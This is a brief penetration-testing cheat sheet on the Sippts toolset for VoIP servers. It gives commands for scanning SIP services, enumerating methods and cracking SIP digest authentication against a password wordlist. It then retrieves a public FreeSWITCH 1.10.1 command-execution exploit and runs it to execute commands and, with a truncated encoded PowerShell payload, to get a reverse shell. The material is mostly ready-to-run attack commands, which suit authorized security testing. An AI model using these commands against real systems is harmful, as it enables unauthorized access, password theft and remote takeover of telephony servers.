> Sippts is a set of tools to audit VoIP servers and devices using SIP protocol. 
> Sippts is programmed in Python and it allows us to check the security of a VoIP server using SIP protocol.


#SIP_Enumeration #SIP

# Download

Clone repo
```
git clone https://github.com/Pepelux/sippts.git
cd sippts
```

# Usage

Scan for SIP services over UDP, TCP or TLS
```
./sipscan.py -i 192.168.69.169/24 -p all -r 5060-5080 -th 200
```

Enumerate methods
```
python3 sipenumerate.py -i 192.168.69.169 -r 5080
```

Crack the digest authentications within the SIP protocol
```
python3 siprcrack.py -i 192.168.69.169 -r 5080 -e 100,101,103-105 -w /usr/share/wordlists/rockyou.txt
```

## FreeSWITCH 1.10.1 Command Execution

Download exploit
```
searchsploit FreeSWITCH 1.10.1
searchsploit -m 47799
```

Use command execution exploit
```
python3 47799.txt 192.168.69.169 whoami
```

Use command execution exploit to get reverse shell
```
python3 47799.txt 192.168.69.123 "powershell -nop -w hidden -e "
```
